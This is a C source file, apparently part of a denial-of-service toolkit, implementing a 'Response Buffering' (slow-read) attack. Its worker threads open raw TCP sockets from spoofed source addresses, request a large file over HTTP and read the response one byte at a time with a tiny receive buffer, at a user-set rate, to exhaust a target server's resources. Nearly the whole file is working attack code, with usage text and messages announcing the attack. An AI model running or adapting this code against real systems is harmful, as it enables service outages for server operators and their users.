#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/body_buffering.h"

#define GET_METHOD "GET /Force.mp3 HTTP/1.1\r\nHost: localhost\r\n\r\n"

#define RESPONSE_BUFFERING_CNT 50

extern int g_num_threads;

// session counting
uint32_t g_resbuf_num_total;
uint32_t g_resbuf_num_generated_in_sec;

// from main()
InputArguments g_resbuf_input;
uint32_t g_resbuf_request_per_sec;

// for masking next ip address
MaskingArguments g_resbuf_now;

// thread
pthread_mutex_t g_resbuf_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_resbuf_cond = PTHREAD_COND_INITIALIZER;

// time checking
struct timespec g_resbuf_before_time;
struct timespec g_resbuf_now_time;

void ResponseBufferingPrintUsage(void)
{
    printf(
            "response buffering Usage : "
            "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
    return;
}

void *GenerateResponseBuffering(void *data)
{
    // making tcp connection
    int sock = -1;
    int src_port, seq, ack;

    int resbuf_cnt = 0;

    sock = MakeRawSocket(IPPROTO_TCP);
    int rvsz = 2;

    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rvsz, sizeof(rvsz));

    fcntl(sock, F_SETFL, O_NONBLOCK);

    MaskingArguments resbuf_now;

    while (1) {
        // *** begin of critical section ***
        pthread_mutex_lock(&g_resbuf_mutex);
        // get now resource

        GetMaskingArguments(&g_resbuf_input, &g_resbuf_now);
        resbuf_now = g_resbuf_now;

        // wait a second
        if (g_resbuf_num_generated_in_sec >= g_resbuf_request_per_sec) {
            pthread_cond_wait(&g_resbuf_cond, &g_resbuf_mutex);
        }
        g_resbuf_num_generated_in_sec++;
        g_resbuf_num_total++;
        // *** end of critical section ***

        pthread_mutex_unlock(&g_resbuf_mutex);
        if (resbuf_cnt % RESPONSE_BUFFERING_CNT == 0) {
            MakeTcpConnection(
                    sock,
                    inet_addr(resbuf_now.src),
                    inet_addr(resbuf_now.dest),
                    &src_port,
                    resbuf_now.port,
                    &seq,
                    &ack,
                    1);

            TcpSocketSendData(
                    sock,
                    inet_addr(resbuf_now.src),
                    inet_addr(resbuf_now.dest),
                    src_port,
                    resbuf_now.port,
                    GET_METHOD,
                    strlen(GET_METHOD),
                    seq,
                    ack,
                    1);
            resbuf_cnt = 0;
        }

        // read a character
        char buffer[2];
        recv(sock, buffer, 2, 0);
        ack++;
        resbuf_cnt++;
    }

    return NULL;
}

void *ResponseBufferingTimeCheck(void *data)
{
    while (1) {
        pthread_mutex_lock(&g_resbuf_mutex);
        TimeCheck(
                &g_resbuf_cond,
                &g_resbuf_before_time,
                &g_resbuf_now_time,
                &g_resbuf_num_generated_in_sec);
        pthread_mutex_unlock(&g_resbuf_mutex);
    }
    return NULL;
}

void ResponseBufferingMain(char *argv[])
{
    int argc = 0;
    while (argv[argc] != NULL) {
        argc++;
    }
    if (argc != 4) {
        ResponseBufferingPrintUsage();
        return;
    }
    ArgvToInputArguments(argv, &g_resbuf_input);
    g_resbuf_num_generated_in_sec = 0;
    g_resbuf_num_total = 0;
    memset(&g_resbuf_before_time, 0, sizeof(struct timespec));
    memset(&g_resbuf_now_time, 0, sizeof(struct timespec));
    g_resbuf_request_per_sec = atoi(argv[3]);
    if (g_resbuf_request_per_sec == 0)
        g_resbuf_request_per_sec = __UINT_MAXIMUM__;
    const int num_threads = g_num_threads;
    pthread_t threads[9999];
    int thread_ids[9999];
    int i;
    for (i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
    }
    printf("Response Buffering attack to %s using %d threads\n",
            g_resbuf_input.dest,
            num_threads);

    for (i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, GenerateResponseBuffering,
                (void*) &thread_ids[i]);
        /*RECEIVE THREAD DEACTIVATION*/
        // pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
    }
    pthread_create(&threads[i], NULL, ResponseBufferingTimeCheck,
            (void*) &thread_ids[i]);
    for (i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
        printf("threads %d joined\n", i);
    }
    pthread_mutex_destroy(&g_resbuf_mutex);
    printf("Response Buffering attack finished.\n");
    pthread_exit(NULL);
    return;
}
